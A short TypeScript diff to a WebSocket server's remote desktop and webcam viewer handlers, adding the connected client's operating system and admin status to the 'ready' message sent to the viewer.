@@ -374,7 +374,7 @@ export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addRdSession(session);
-  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, os: target?.os ?? "", isAdmin: !!target?.isAdmin });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
     return;
@@ -710,7 +710,7 @@ export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addWebcamSession(session);
-  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, os: target?.os ?? "", isAdmin: !!target?.isAdmin });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
     return;
